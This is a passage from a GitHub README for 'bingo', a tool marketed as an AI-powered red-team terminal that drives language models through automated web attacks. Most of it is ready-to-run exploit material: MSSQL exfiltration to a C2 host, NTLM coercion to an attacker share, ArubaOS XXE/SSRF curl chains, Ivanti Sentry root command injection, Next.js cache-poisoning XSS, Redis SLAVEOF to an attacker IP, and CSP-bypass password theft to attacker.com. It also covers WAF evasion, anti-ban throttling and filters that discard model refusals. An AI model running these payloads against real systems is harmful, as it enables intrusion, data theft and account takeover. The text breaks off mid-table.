<div align="center">

<img src="assets/logo.png" width="180" alt="bingo logo"/>

# bingo

**AI-Powered Red Team Terminal**

[![Version](https://img.shields.io/badge/version-2.8.0-brightgreen?logo=github)](https://github.com/bingook/bingo/releases)
[![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/bingook/bingo)
[![Status](https://img.shields.io/badge/status-Official%20Release-brightgreen)](https://github.com/bingook/bingo)

*DeepSeek · Claude · GPT · GLM · Qwen · Ollama · Custom*

**🌐 Language / 언어 / 语言:**
[English](README.md) · [한국어](README_ko.md) · [中文](README_zh.md)

> **v2.8.0 — Advanced SQLi Engine (Beyond sqlmap)**  
> 60+ tamper scripts · Out-of-Band (DNS/HTTP) extraction · UDF/xp_cmdshell RCE · LOAD_FILE file read · INTO OUTFILE webshell · Second-order injection · Level 1–5 / Risk 1–3 · Auto hash cracking · Precise DB fingerprinting

</div>

---

## What is bingo?

bingo is a hacker-style AI terminal that automates real penetration testing workflows. You type a target URL, and bingo runs a full red team pipeline — WAF detection, vulnerability scanning, SQL injection, file upload exploitation, IDOR enumeration, hash cracking, and auto-generated reports — all powered by the AI model of your choice.

**Zero-Hallucination Engine** (v2.3.13 — 4-layer enforcement): Every AI response is validated at four independent layers before any output is accepted. (1) Code blocks: JSON dicts, stubs, and simulation code are rejected. (2) Text-level: JSON plans and AI self-confessions are intercepted. (3) Fake credentials: usernames/passwords/hashes claimed without HTTP evidence are blocked. (4) **NEW — Unproven conclusions**: Any statement claiming "SQLi found", "WAF bypassed", "admin access succeeded", or "DB extracted" WITHOUT an accompanying code block is automatically blocked and the AI is forced to produce Python `requests` code that proves the claim. Nothing is accepted without real HTTP response evidence.

**Pentest Precision Engine** (new in v2.2): AI automatically applies high-precision analysis when a web target is given. Eliminates false positives from WAF silent-blocks, auto-solves CAPTCHA via ddddocr, accurately extracts session tokens and form fields, fingerprints tech stacks with version details, and auto-generates WAF bypass payload variants. Zero-interaction: the AI selects and applies it automatically based on context.

| Feature | Description |
|---|---|
| False Positive Elimination | Validates SQLi via error keywords / time delay ≥2.5× baseline / UNION marker / length diff |
| CAPTCHA OCR | ddddocr auto-solve; GnuBoard kcaptcha session order handled automatically |
| Token Extraction | Correct `token` key from `write_token.php` JSON; all hidden fields auto-extracted |
| Tech Fingerprinting | CMS / WAF / PHP version from headers+HTML; bypass strategy auto-recommended |
| Login Attack | Accurate success detection; Korea-specific credentials; SQLi auth bypass payloads |
| WAF Bypass Generator | Space substitution / case mix / URL encode / inline comment / HPP variants |

**Burp Engine** (new in v2.3): Full Burp Suite feature set implemented in pure Python. No Burp Suite installation required. Community or Pro — irrelevant. The AI automatically selects the appropriate Burp-equivalent module based on context.

| Burp Feature | bingo Equivalent | Description |
|---|---|---|
| Repeater | `burp_engine.repeater()` | Replay HTTP requests with custom headers/body/params. Measures response time for time-based SQLi. |
| Intruder | `burp_engine.intruder()` | Payload fuzzing at `§payload§` markers. Sniper / Battering Ram / Pitchfork / Cluster Bomb modes. Multi-threaded. |
| Scanner (Passive) | `burp_engine.scanner_passive()` | Detect missing security headers (CSP/HSTS/X-Frame-Options), server version disclosure, stack trace exposure. |
| Scanner (Active) | `burp_engine.scanner_active()` | Inject SQLi / XSS / SSTI payloads into parameters and analyze responses. No Burp Pro needed. |
| Decoder | `burp_engine.decoder()` | Base64 / URL / HTML / Hex / Gzip auto-encode and decode. Full `%XX` encoding for WAF bypass. |
| Comparer | `burp_engine.comparer()` | Diff two HTTP responses by length and content. Confirms boolean-based SQLi. |
| Collaborator | `burp_engine.CollaboratorClient()` | Out-of-band detection via interactsh. SSRF / XXE / RCE / Log4Shell callbacks. No Burp Pro required. |
| Proxy | `burp_engine.BurpProxy()` | Intercept and log HTTP traffic with optional request modifier. History dump included. |
| File Input Traversal | `burp_engine.scan_file_input_traversal()` | Detect path traversal in `<input type="file">` accept/value attributes. Based on HackerOne #3712279 (Burp Suite RCE via crawler). Also tests server-side upload handlers. |
| **Hash Context Filter** | `hash_crack.extract_hashes_from_text(strict=True)` | **Smart false-positive filter for hash detection.** Skips error codes, tracking IDs, and HTTP error-page hex strings that match the MD5/NTLM pattern but are not password hashes. Filters: error-code keywords, HTTP 4xx/5xx context, mixed-case hex pattern, prefix match (`code=`, `id=`, `ref=`). |

---

## Installation

### Option A — pip (Recommended, all platforms)

The easiest way. Works on macOS, Windows, and Linux.

```bash
pip install bingo-ai
```

Then run:

```bash
bingo
```

To update later:

```bash
bingo --update
# or
pip install --upgrade bingo-ai
```

---

### Option B — git clone (macOS / Linux)

```bash
curl -fsSL https://raw.githubusercontent.com/bingook/bingo/main/install.sh | bash
```

Or clone manually:

```bash
git clone https://github.com/bingook/bingo.git
cd bingo
bash install.sh
```

To update later:

```bash
bingo --update
# or
cd bingo && git pull origin main
```

---

### Windows

> ⚠️ **Run in PowerShell** (not CMD).  
> Start → search `PowerShell` → **Right-click → Run as Administrator**

**Option 1 — Auto-install (recommended):**
```powershell
irm https://raw.githubusercontent.com/bingook/bingo/main/install.ps1 | iex
```

**Option 2 — If execution policy error:**
```powershell
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
irm https://raw.githubusercontent.com/bingook/bingo/main/install.ps1 | iex
```

**Option 3 — Manual install (most reliable):**
```powershell
git clone https://github.com/bingook/bingo.git $env:USERPROFILE\bingo
cd $env:USERPROFILE\bingo
python -m pip install -e .
python -m bingo
```

**Option 4 — Without git:**
```powershell
Invoke-WebRequest "https://github.com/bingook/bingo/archive/main.zip" -OutFile "$env:TEMP\bingo.zip" -UseBasicParsing
Expand-Archive "$env:TEMP\bingo.zip" "$env:USERPROFILE" -Force
Rename-Item "$env:USERPROFILE\bingo-main" "$env:USERPROFILE\bingo"
cd "$env:USERPROFILE\bingo"
python -m pip install -e .
python -m bingo
```

> **Requirements:** Python 3.10+, PowerShell 5.1+

---

## Quick Start

```bash
bingo                      # Launch interactive terminal
bingo scan https://target.com  # Full automated red team scan
bingo --version            # Show version
bingo --reset              # Reset configuration
```

On first launch: **select language → enter AI model API key → start hacking**.

---

## Core Features

### Zero-Hallucination System (v2.3.13 — 4-Layer Enforcement)

Every AI response passes through four independent validation layers before being accepted:

**Layer 1 — Code Block Guard** (runtime)
- Rejects Python code blocks that contain only JSON dicts, empty stubs, or `print()` without HTTP calls
- Forces a rewrite with real `requests.get/post` calls

**Layer 2 — Text Hallucination Intercept** (text-level)
- Rejects AI responses that begin with `{` or `[` (JSON plan format)
- Intercepts AI self-confessions: `"my environment is limited to text"`, `"无法直接生成文件"`, etc.

**Layer 3 — Fake Credential Block** (credential-level)
- Blocks any response that presents `username:`, `password:`, or `hash:` values without an accompanying code block
- Prevents the AI from inventing credentials it has never actually extracted

**Layer 4 — Unproven Conclusion Block** *(NEW in v2.3.12, active in v2.3.13)*
- Blocks statements like `"SQLi vulnerability confirmed"`, `"WAF bypass successful"`, `"admin login succeeded"`, `"database extracted"` **when no code block is present**
- The AI cannot claim a finding without first running Python code that produces HTTP response evidence
- Trigger phrases (any language): SQLi/XSS/RCE/SSRF confirmed, WAF bypass success, DB access success, admin login success, credentials extracted

**Evidence levels in reports:**

| Level | Meaning |
|-------|---------|
| `✅ VERIFIED` | HTTP response confirmed (status code + body) |
| `🟡 LIKELY` | Partial evidence (pattern match + URL) |
| `🔍 INFERRED` | Reasoning only — manual verification needed |
| `🤖 AI_ANALYSIS` | AI analysis text, clearly separated |

**No claim is accepted without HTTP evidence. Every conclusion must follow from actual code execution.**

---

### Automated WAF Detection & Bypass

When a target URL is mentioned in chat, bingo automatically:
1. Detects WAF type from HTTP headers and response patterns
2. Identifies the WAF vendor (Cloudflare, AWS WAF, ModSecurity, Nginx/OpenResty, etc.)
3. **AI selects the optimal bypass technique automatically** based on WAF type
4. Executes all steps as real Python scripts — no external tool required

| WAF | Detection Method |
|-----|-----------------|
| Cloudflare | `cf-ray` header, block page signature |
| AWS WAF | `x-amzn-requestid` header, 403 pattern |
| ModSecurity | Server header, error page content |
| Nginx/OpenResty | 406 Not Acceptable, server banner |
| Sucuri / Akamai / F5 BIG-IP | Body pattern + status code |
| Chinese WAF (Safe3 / D盾 / 云锁) | Body keyword matching |

#### Advanced WAF Bypass Techniques (v2.2.0+)

bingo now includes a **6-layer advanced bypass engine** that AI activates automatically when basic techniques fail:

| Layer | Technique | When Used |
|-------|-----------|-----------|
| **SQL Function Replacement** | `IF(a,b,c)` → `CASE WHEN a THEN b ELSE c END` | WAF blocks `IF` keyword |
| **Timing via Heavy Subquery** | `SLEEP(n)` → `information_schema` cross-join | WAF blocks `SLEEP` / `BENCHMARK` |
| **GREATEST/LEAST** | Replace `=` comparison with `GREATEST(a,b)=b` | WAF detects equality operators |
| **Logical Operator Alt** | `AND` → `&&`, `OR` → `\|\|` | WAF blocks literal `AND`/`OR` |
| **Unicode / Overlong UTF-8** | `'` → `\uff07`, `/` → `%c0%af`, NULL byte injection | Legacy / regex-based WAF |
| **HTTP Chunked Transfer** | POST body split into 3–7 byte chunks | WAF without body reassembly |

##### AI Auto-Selection Logic

bingo's AI reads the WAF type and automatically picks the right bypass order:

```
Cloudflare      → double URL encoding → unicode → ua spoofing → function replace
Nginx/OpenResty → %0a newline → /**/ comment → keyword obfuscation
ModSecurity     → space/**/ → IF→CASE WHEN → mixed case → encoding
AWS WAF         → encoding → SLEEP→subquery → XFF header → space
Chinese WAF     → null byte unicode → overlong UTF-8 → function replace
Generic         → space → keyword → header spoof → encoding → function
```

When all single techniques fail, bingo automatically tries **3-layer combinations**:
1. `function_replace + space + XFF header`
2. `unicode encoding + function_replace`
3. HTTP Chunked POST (last resort)

##### Anti-IP-Ban Strategy

bingo applies random delays (`1.0–3.5s`) between requests to avoid triggering WAF/IPS rate-limit bans. This is applied automatically during all WAF bypass attempts.

---

### Interactive Post-Report Actions (v2.1)

After every report is generated, bingo presents **3–5 numbered next steps**:

```
╭─ Report saved: targets/report_example.com.md ─╮
│ What to do next?                               │
╰────────────────────────────────────────────────╯

  #  Next Options
  ─────────────────────────────────────────────
  1  Run IDOR scan on /api/user?id= endpoints
  2  Attempt IDOR-based password reset
  3  Upload GIF polyglot webshell via /upload
  4  Deep SQLi on login form with sqlmap flags
  5  Check for exposed phpinfo() or .env files

▶ Enter number + Enter (0 = exit, other = type freely)

  > _
```

Enter a number to continue automatically — no need to think about what to do next.

---

### API Discovery & AI-Powered Fuzzing (v2.1)

Inspired by Brutecat's research ("Hacking Google with AI for $500,000"), bingo automatically discovers API documentation and fuzzes every endpoint using AI-guided parameter testing.

**Step 1 — Auto-discover API docs:**

bingo probes 30+ common paths to find machine-readable API specifications:

| Doc type | Paths probed |
|----------|-------------|
| OpenAPI / Swagger | `/swagger.json`, `/openapi.json`, `/v1/api-docs`, `/v3/api-docs`, ... |
| Google Discovery | `/$discovery/rest`, `/discovery/v1/apis` |
| GraphQL | `/graphql`, `/graphiql`, `/api/graphql` |
| WordPress | `/wp-json` |
| Spring Boot | `/actuator/mappings` |

**Step 2 — AI auto-fuzzes every endpoint:**

Once endpoints are found, bingo tests them automatically:
- **Unauthenticated access** — calls every API with no cookies or tokens; `200 OK` = confirmed bypass
- **Parameter fuzzing** — injects IDOR, SQLi, SSTI, and path traversal payloads into query parameters
- **Sensitive keyword detection** — flags responses containing `password`, `token`, `traceback`, SQL error messages, etc.
- **500 error detection** — server errors triggered by payloads indicate possible injection points

**Evidence labeling:**
```
VERIFIED  = real HTTP 200 response with sensitive data confirmed
LIKELY    = suspicious response pattern (500 error, auth keyword)
INFERRED  = structural pattern match only
```

**AI auto-trigger conditions:**
- Always runs (low cost, high discovery value)
- Escalates to fuzzing only when endpoints are actually found

---

### MSSQL 2025 AI Feature Exploitation (v2.1)

> **Research basis:** [SpecterOps — "Oops, I Weaponized the Database: Abusing AI Features in SQL Server 2025"](https://specterops.io/blog/2026/06/10/oops-i-weaponized-the-database-abusing-ai-features-in-mssql-2025/)

SQL Server 2025 introduced native AI capabilities that create entirely new attack surfaces. bingo automatically detects these conditions and generates exploitation PoCs when all three prerequisites are met.

**AI auto-trigger conditions (all three must be confirmed):**

| Condition | How bingo checks |
|-----------|-----------------|
| Target runs SQL Server 2025 | `@@version` injection or version string in error response |
| SQL injection allows stacked queries | `WAITFOR DELAY '0:0:3'` — response delay ≥ 2.5 s = confirmed |
| DB account has elevated privileges | `IS_SRVROLEMEMBER('sysadmin')` time-based check |

If any condition is not met, the module is automatically skipped — no false positives, no impact on other DB engines (MySQL, PostgreSQL, Oracle).

**Exploitation techniques (PoC generation only — not auto-executed):**

| Technique | Attack primitive | Impact |
|-----------|-----------------|--------|
| `sp_invoke_external_rest_endpoint` | POST entire DB tables to attacker server | Full data exfiltration (up to 100 MB) |
| `CREATE EXTERNAL MODEL` (UNC path) | Load model from `\\attacker-ip\share` → NTLM coercion | Admin password hash capture |
| `AI_GENERATE_EMBEDDINGS` (UNC path) | Same UNC trick via embedding model | Covert C2 channel / NTLM relay |

**Generated PoC example:**

```sql
-- Enable REST endpoint
EXEC sp_configure 'external rest endpoint enabled', 1; RECONFIGURE;

-- Exfiltrate users table to attacker server
DECLARE @p NVARCHAR(MAX);
SELECT @p = (SELECT * FROM dbo.users FOR JSON AUTO);
EXEC sp_invoke_external_rest_endpoint
    @url = N'https://YOUR-C2/collect',
    @method = 'POST',
    @payload = @p;

-- NTLM hash coercion via external model
CREATE EXTERNAL MODEL ntlm_bait WITH (
    LOCATION = '\\YOUR-ATTACKER-IP\share',
    API_FORMAT = 'ONNX Runtime',
    MODEL_TYPE = EMBEDDINGS,
    MODEL = 'capture'
);
```

**Evidence labeling:**
```
VERIFIED  = WAITFOR DELAY confirmed stacked query + version string confirmed
LIKELY    = MSSQL error detected but version unconfirmed
INFERRED  = MSSQL fingerprint only, stacked queries not tested
```

**Remediation (auto-included in report):**
1. `EXEC sp_configure 'external rest endpoint enabled', 0; RECONFIGURE;`
2. Block outbound connections from the SQL Server host at the firewall
3. Remove `sysadmin` privilege from the application DB account
4. Apply SQL injection patch (Parameterized Query)

---

### ArubaOS Pre-Auth XXE → OOB SSRF (v2.1)

> **Research basis:** [netacoding.com — "Pre-Authentication XXE → OOB SSRF in ArubaOS 8.x"](https://netacoding.com/posts/xxe-ssrf/)  
> **Severity:** CVSS 9.3 Critical  
> **Disclosed:** Bugcrowd submission 9e946ca3 (closed as "theoretical")

HPE Aruba ArubaOS 8.13.2.0 and earlier expose an **unauthenticated XML management API on port 32000/TCP**. The API processes XML `SYSTEM` entities without authentication, allowing a pre-auth attacker to force the controller to make arbitrary outbound HTTP requests (OOB SSRF) and scan internal network services.

**AI auto-trigger conditions:**

| Condition | How bingo checks |
|-----------|-----------------|
| Port 32000/TCP open | TCP socket connect (3 s timeout) |
| ArubaOS XML API banner | `<dialog>`, `aruba`, `ArubaOS` in HTTP response |
| Automatic on match | No user interaction required |

If port 32000 is not reachable, the module is silently skipped — zero false positives, no impact on other scan modules.

**Attack chain bingo detects:**

| Step | Technique | Evidence level |
|------|-----------|---------------|
| 1 | Port 32000 open confirmation | `VERIFIED` — TCP socket |
| 2 | ArubaOS XML API banner detection | `VERIFIED` — response content match |
| 3 | OOB SSRF callback (with OOB server) | `VERIFIED` — actual HTTP callback received |
| 4 | Timing-based blind XXE (no OOB server) | `LIKELY` — request timeout anomaly |
| 5 | Internal port scan via SSRF | `VERIFIED` — response content differs per port |

**PoC payload (auto-generated in report):**

```xml
<!-- Step 1: Basic OOB SSRF — triggers outbound connection to attacker -->
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY xxe SYSTEM "http://YOUR-SERVER:9999/xxe-probe">
]>
<aruba><opcode>&xxe;</opcode></aruba>
```

```bash
# Full automated curl PoC (generated by bingo in report)
# Step 1: Start listener
nc -lvp 9999

# Step 2: Send XXE payload
curl -s -X POST 'http://TARGET:32000/' \
  -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://YOUR-IP:9999/probe">]><aruba><opcode>&xxe;</opcode></aruba>'

# Step 3: Internal port scan via SSRF
for port in 22 80 443 3306 5432 9200; do
  curl -s -X POST 'http://TARGET:32000/' \
    -H 'Content-Type: text/xml' \
    -d "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY x SYSTEM \"http://127.0.0.1:$port/\">]><aruba><opcode>&x;</opcode></aruba>"
done
```

**Evidence labeling:**
```
VERIFIED  = OOB callback actually received by attacker server
LIKELY    = request timeout anomaly (server attempted external connection)
INFERRED  = port 32000 open + Aruba banner, but XXE not confirmed
```

**Remediation (auto-included in report):**
1. Upgrade ArubaOS to the latest version immediately
2. Block port 32000/TCP from external access at the firewall (management VLAN only)
3. Disable XML External Entity processing in the XML API parser
4. Enforce authentication on all XML API endpoints (AAA profile)
5. Restrict outbound HTTP connections from the controller to a whitelist

---

### OAuth Misconfiguration Chain Attack Detection (v2.1)

> **Research basis:**  
> [Shafayat Ahmed Alif — "Critical OAuth Misconfiguration → Account Takeover"](https://medium.com/@iamshafayat/how-i-found-a-critical-oauth-misconfiguration-that-led-to-account-takeover-abfec43eaea6)  
> [Ali Mojaver — "The Most Dangerous OAuth Bug I've Ever Found"](https://medium.com/@AliMojaver/the-most-dangerous-oauth-bug-ive-ever-found-a2af1275385c)

Two distinct OAuth attack chains auto-detected and combined into a single scanner.

#### Pattern A — Open Registration Chain (Shafayat's 5-step ATO chain)

| Step | Check | Severity |
|------|-------|----------|
| ① | `POST /oauth/register` (no auth) → HTTP 201 + `client_id` returned | High |
| ② | `POST /oauth/authorize` (no session cookie) → HTTP 200/201 + `redirect_uri` | Critical |
| ③ | Token exchange using PKCE only (no `client_secret`) | Medium |
| ④ | `OPTIONS /oauth/token` → `Access-Control-Allow-Origin: *` | Medium |
| Chain | All 4 conditions: full Authorization Code Hijacking → ATO | **Critical** |

#### Pattern B — Unverified Email OAuth Trust (Ali Mojaver's email-trust chain)

| Step | Check | Severity |
|------|-------|----------|
| ① | `POST /auth/register` with arbitrary email → immediate token returned (no verification required) | High |
| ② | Platform serves `/.well-known/oauth-authorization-server` or shows OAuth provider patterns | Medium |
| Chain | ① + ②: Register as `victim@gmail.com` → login as victim on ALL integrated sites | **Critical** |

#### AI Auto-Trigger Conditions
- `/.well-known/oauth-authorization-server` accessible (HTTP 200)
- Response contains `authorization_endpoint` / `token_endpoint` / `client_id=`
- Target URL contains `/oauth/`, `/auth/`, `/connect/`
- Homepage contains OAuth login button patterns

#### Chain Risk Score
- **Pattern A**: 0–5 points (3+ = High, 5 = Critical)
- **Pattern B**: 0–3 points (2+ = Critical — mass ATO risk)
- cURL PoC auto-generated for all confirmed findings

---

### Ivanti Sentry Pre-Auth RCE — CVE-2026-10520 (v2.1)

> **Research basis:** [watchTowr Labs — "Ivanti Sentry Pre-Auth OS Command Injection CVE-2026-10520"](https://labs.watchtowr.com/more-evidence-that-words-dont-mean-what-we-thought-they-meant-ivanti-sentry-pre-auth-os-command-injection-cve-2026-10520/)  
> **Severity:** CVSS 10.0 Critical  
> **Companion:** CVE-2026-10523 — Authentication Bypass (admin account creation)

Ivanti Sentry (formerly MobileIron Sentry) versions before R10.5.2/R10.6.2/R10.7.1 expose an **unauthenticated POST endpoint** that passes user input directly into an internal MICS configuration engine — allowing pre-auth OS command injection as **root**.

**Vulnerable endpoint:**
```
POST /mics/api/v2/sentry/mics-config/handleMessage
```

**AI auto-trigger conditions:**

| Condition | How bingo checks |
|-----------|-----------------|
| Ivanti Sentry product present | `GET /mics/login.jsp` exists (HTTP 200/302) |
| Endpoint reachable without auth | `POST /mics/.../handleMessage` → no 302 redirect |
| Patched version detection | HTTP 302 to login page = patched, skip module |

If none of the conditions match, the module is silently skipped — no impact on other scan phases.

**How the injection works:**

```
message= execute system /configuration/system/commandexec
         <commandexec>
           <index>1</index>
           <reqandres>OS_COMMAND_HERE</reqandres>
         </commandexec>
```

The `message` parameter is parsed as a MICS configuration command → routed to `EXECUTE` handler → `executeNativeCommand()` via Java reflection → **root shell execution**.

**PoC (bingo auto-generates in report):**

```bash
# Confirm RCE — no credentials required
curl -sk -X POST 'https://TARGET/mics/api/v2/sentry/mics-config/handleMessage' \
  -d 'message=execute system /configuration/system/commandexec <commandexec><index>1</index><reqandres>id</reqandres></commandexec>'

# Expected response (VERIFIED evidence):
# {"status":200,"data":"<result><success>uid=0(root) gid=0(root)\n</success></result>"}
```

**Evidence labeling:**

```
VERIFIED  = command output extracted from HTTP response (id / uname -a)
LIKELY    = endpoint accessible (no 302) but no command output confirmed
INFERRED  = /mics/login.jsp exists, endpoint not yet tested
```

**Safe probe mode (default):** bingo only executes read-only commands (`id`, `uname -a`, `hostname`) — no system modifications.

**Affected versions:**

| Version | Status |
|---------|--------|
| < R10.5.2 | **Vulnerable** |
| < R10.6.2 | **Vulnerable** |
| < R10.7.1 | **Vulnerable** |
| R10.5.2+ / R10.6.2+ / R10.7.1+ | Patched |

**Remediation (auto-included in report):**
1. Upgrade Ivanti Sentry to R10.5.2 / R10.6.2 / R10.7.1 immediately
2. Block `/mics/api/v2/sentry/mics-config/handleMessage` at the firewall
3. Restrict Sentry management interface to isolated management VLAN only
4. Apply CVE-2026-10523 patch simultaneously (admin account creation bypass)
5. Review `/mics/` access logs for abnormal POST requests (incident investigation)

---

### Next.js Cache Poisoning → 0-click SXSS (v2.1)

> **Research basis:**  
> [Rachid Allam (zhero;) & inzo\_ — "Re:CACHE - Excessive reflection, type confusion, and 0-click SXSS on Next.js"](https://zhero-web-sec.github.io/research-and-things/re-cache-excessive-reflection-type-confusion-and-0-click-sxss-on-nextjs)  
> Rewarded: **five-figure bug bounty** at a globally recognized company

**Attack chain:**

```
① Request headers reflected in response headers (middleware misconfiguration)
    Request:  Content-Type: text/html
    Response: Content-Type: text/html  ← reflected as-is
    
② Next.js App Router + RSC payload context switch
    GET /dynamic-page?pwn=<xss>  +  Rsc: 1  +  Content-Type: text/html
    → RSC payload served as text/html instead of text/x-component
    → URL params reflected in RSC body after __PAGE__ marker → XSS context
    
③ Cloudflare caches poisoned response (ignores Vary: Rsc)

④ Stage 2: Home page poisoned with Refresh header
    GET /  +  Refresh: 0; /dynamic-page?pwn=<xss>
    → Victim visits homepage → auto-redirected → XSS fires
    
⑤ Zero-click: no user interaction required
```

**AI auto-trigger conditions** (bingo runs this automatically):

| Condition | Detection method |
|-----------|-----------------|
| `x-powered-by: Next.js` | HTTP response header |
| `_next/static` or `__NEXT_DATA__` in body | HTML body scan |
| `cf-cache-status` header present | Cloudflare detection |
| RSC response changes with `Rsc: 1` header | Active probe |

**Finding types and evidence levels:**

| Finding | Evidence Level | Severity |
|---------|---------------|----------|
| `nextjs_detected` | `VERIFIED` | Info |
| `cache_layer` | `VERIFIED` (cf-cache-status header) | Medium |
| `header_reflection` | `VERIFIED` (Content-Type changes) | High |
| `rsc_dynamic_page` | `VERIFIED` (HTTP 200 + x-component) | Medium |
| `content_type_injection` | `VERIFIED` (response CT = text/html) | High |
| `param_reflected_in_rsc` | `VERIFIED` (marker in body) | Critical |
| `cache_sxss_chain` | `VERIFIED`/`LIKELY` | Critical |

**Auto-generated PoC:**

```bash
# Stage 1: Poison dynamic page
curl -sk 'https://target.com/about?pwn=<img src=x onerror=alert(1)>' \
  -H 'Rsc: 1' \
  -H 'Content-Type: text/html' -D -

# Stage 2: Poison homepage with Refresh redirect
curl -sk 'https://target.com/' \
  -H 'Refresh: 0; https://target.com/about?pwn=<img src=x onerror=alert(1)>' \
  -D -

# Result: victim visits https://target.com/ → XSS fires automatically
```

**Vulnerable conditions (all must be true for full chain):**

1. Next.js App Router (not Pages Router)
2. Middleware forwards request headers to response headers
3. External cache layer (Cloudflare, CDN) that ignores `Vary: Rsc`
4. Dynamic pages with URL parameter → RSC body reflection

**Remediation (auto-included in report):**
1. **Remove header forwarding** in middleware — never pass request `Content-Type` to response
2. Force `Content-Type: text/x-component` for all RSC responses (non-overridable)
3. Exclude RSC paths from CDN caching (`Cache-Control: no-store`)
4. HTML-encode all URL parameters before including in RSC payload
5. Upgrade to Next.js 14.2.32+ / 15.4.7+

---

### Redis DarkReplica UAF → Post-Auth RCE (CVE-2026-23631) (v2.1)

> **Research basis:**  
> [Yoni Sherez — "DarkReplica: Redis CVE-2026-23631"](https://www.zeroday.cloud/blog/redis-cve-2026-23631-dark-replica)  
> **$30,000** at London Security Conference 2025  
> **Skill module:** `RedisDarkReplica` (id: 48)

**Vulnerability overview:**

Redis is single-threaded, but calls `processEventsWhileBlocked()` during Lua function execution timeouts. This allows the replication subsystem to process `FULLRESYNC` events from a master server **while a Lua function is still running**. The `lua_State` object gets freed mid-execution, leading to a **Use-After-Free (UAF)** condition that enables arbitrary read/write primitives and ultimately code execution.

**Attack chain:**

```
① Attacker authenticates to Redis (requires credentials OR no-auth Redis)

② Register slow Lua function (blocks for >lua-time-limit ms)
   FUNCTION LOAD "#!lua name=exploit\nredis.register_function('slow',
     function(keys,argv) while 1 do end end)"

③ Assign victim Redis as slave of attacker's fake master server
   SLAVEOF attacker_ip 8474
   CONFIG SET slave-read-only no

④ Attacker's fake master sends FULLRESYNC at exact moment Lua is running
   → processEventsWhileBlocked() frees lua_State while Lua still executing

⑤ UAF: Heap spray reallocates freed memory with attacker data
   → Arbitrary read/write → ASLR bypass → system() → RCE
```

**AI auto-trigger conditions** (bingo automatically activates when):

| Condition | Detection method |
|-----------|-----------------|
| Port 6379/6380/6381/6382 open | TCP connect probe |
| Redis PING → PONG response | Banner confirmation |
| `redis`, `jedis`, `ioredis` in target URL/body | Keyword scan |
| Redis credentials found in previous scan | Session credential store |

**Finding types and evidence levels:**

| Finding | Evidence Level | Severity |
|---------|---------------|----------|
| `redis_found` | `VERIFIED` (PING→PONG) | Info |
| `redis_noauth` | `VERIFIED` (no AUTH required) | Critical |
| `redis_weak_auth` | `VERIFIED` (AUTH '' success) | Critical |
| `redis_auth_success` | `VERIFIED` (AUTH credential success) | High |
| `vulnerable_version` | `VERIFIED` (INFO server version check) | Critical |
| `patched_version` | `VERIFIED` | Info |
| `slaveof_allowed` | `VERIFIED` (SLAVEOF NO ONE → OK) | High |
| `function_engine_available` | `VERIFIED` (FUNCTION LIST response) | High |
| `dark_replica_exploitable` | `VERIFIED` (all conditions confirmed) | Critical |
| `dark_replica_likely` | `LIKELY` (version vulnerable, partial perms) | Critical |

**Affected versions:**

| Series | Vulnerable | Fixed |
|--------|-----------|-------|
| 7.2.x | 7.2.0 – 7.2.13 | **7.2.14** |
| 7.4.x | 7.4.0 – 7.4.8 | **7.4.9** |
| 8.2.x | 8.2.0 – 8.2.5 | **8.2.6** |
| 8.4.x | 8.4.0 – 8.4.2 | **8.4.3** |
| 8.6.x | 8.6.0 – 8.6.2 | **8.6.3** |

**Auto-generated PoC (included in report):**

```bash
# Step 1: Verify vulnerable version
redis-cli -h TARGET -p 6379 INFO server | grep redis_version

# Step 2: Register slow Lua function
redis-cli -h TARGET -p 6379 FUNCTION LOAD \
  "#!lua name=exploit\nredis.register_function('slow', \
   function(keys,argv) local co=coroutine.create(function() while 1 do end end); \
   coroutine.resume(co) end)"

# Step 3: Assign victim as slave of attacker
redis-cli -h TARGET -p 6379 SLAVEOF attacker_ip 8474
redis-cli -h TARGET -p 6379 CONFIG SET slave-read-only no

# Step 4: Trigger UAF (run fake master + FCALL simultaneously)
redis-cli -h TARGET -p 6379 FCALL slow 0
# Expected: RCE via system() after heap spray
```

**Zero-Hallucination guarantee:**
- Version check performed via actual `INFO server` response → `VERIFIED`
- All permission checks (SLAVEOF, FUNCTION) are read-safe and non-destructive
- Exploitability flag only set when ALL conditions confirmed

**Remediation (auto-included in report):**
1. **Patch immediately** — upgrade to fixed version for your series
2. **Block Redis externally** — firewall port 6379 from public internet
3. **Enable authentication** — `requirepass <strong-random-password>`
4. **ACL restrictions** — limit `SLAVEOF`, `REPLICAOF`, `FUNCTION LOAD` to admin users only
5. **Reduce Lua time limit** — `lua-time-limit 500` to minimize UAF trigger window
6. **Network isolation** — bind Redis to `127.0.0.1` or internal VLAN only

---

### HTML Injection + Chrome Password Autofill → CSP Bypass Password Theft (v2.1)

> **Research basis:**  
> [Rafał Wójcicki (AFINE) — "Stealing Passwords via HTML Injection Under a Strict CSP"](https://afine.com/blogs/stealing-passwords-via-html-injection-under-a-strict-csp)  
> Published: May 26, 2026  
> **Skill module:** `HtmlAutofillSteal` (id: 49)

**Key insight:**

A strict Content-Security-Policy (`script-src 'none'`, `default-src 'none'`) **blocks XSS** but does **NOT** block:
- HTML injection (planting a fake form)
- `<meta http-equiv="Refresh">` redirects
- `<meta name="referrer" content="unsafe-url">` overrides
- Chrome password autofill filling any matching form on the domain

This enables **password exfiltration without any JavaScript**, even on maximally hardened pages.

**Attack chain:**

```
① Reflected HTML injection found in GET parameter
   GET /?html=<b>test</b>  →  <b>test</b> rendered in response

② Inject fake login form (email + password fields)
   Chrome password manager auto-fills saved credentials for the domain

③ Form submitted via GET → credentials appear in URL as query params
   /?email=victim@gmail.com&password=S3cr3tP@ss

④ Override Referrer-Policy via injected <meta> tag
   <meta name="referrer" content="unsafe-url">
   → Chrome sends full URL (including password) in Referer header

⑤ Meta-refresh redirect to attacker's server
   <meta http-equiv="Refresh" content="0,url=https://attacker.com">
   → Attacker's server receives: Referer: /?email=victim@...&password=S3cr3tP@ss

⑥ Result: saved password exfiltrated via single user click
```

**Why browsers are exploitable:**

| Browser | No policy | `no-referrer` set |
|---------|-----------|-------------------|
